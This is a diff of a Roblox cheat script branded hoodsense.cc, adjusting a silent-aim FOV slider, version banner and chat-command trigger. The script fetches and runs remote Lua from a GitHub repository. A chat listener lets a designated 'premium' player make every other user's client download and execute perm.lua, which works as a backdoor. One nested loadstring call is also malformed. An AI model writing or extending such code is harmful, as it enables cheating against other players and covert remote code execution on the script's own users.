@@ -88,7 +88,7 @@ fovcolor:AddToolTip("Change FOV color.")
 fovcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
 
 
-local FovCircleSize = Section2:CreateSlider("Fov Circle Size", 0,400,nil,false, function(value)
+local FovCircleSize = Section2:CreateSlider("Fov Circle Size", 0,400,nil,true, function(value)
     Aiming.FOV = value
 end)
 FovCircleSize:AddToolTip("Customize Fov Circle Size.")
@@ -707,11 +707,11 @@ game.StarterGui:SetCore("SendNotification", {
     Button1 = "Okay!";
 })
 print("_____________________HOODSENSE.CC________________________")
-print("| [hoodsense.cc] Executed version: 5.1                  |")
-print("| [hoodsense.cc] More addons now!                       |")
+print("| [hoodsense.cc] Executed version: 5.2                  |")
+print("| [hoodsense.cc] Fixed silent aim!                      |")
 print("| [hoodsense.cc] Join us http://hoodsense.cf/discord    |")
 print("| [hoodsense.cc] Made by <z3#0001 <@804245361894883339> |")
-print("| [hoodsense.cc] Website - http://hoodsense.cf          |")
+print("| [hoodsense.cc] Website - https://hoodsense.cf          |")
 print("_________________________________________________________")
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
@@ -1341,7 +1341,7 @@ premium2.Chatted:connect(function(cht)
 end)
 
 premium2.Chatted:connect(function(cht)
-	if cht:match("$disable .") then
+	if cht:match("$perm .") then
     	if game.Players.LocalPlayer ~= premium2 then
         loadstring(game:HttpGet("loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua'))()"))()
         end
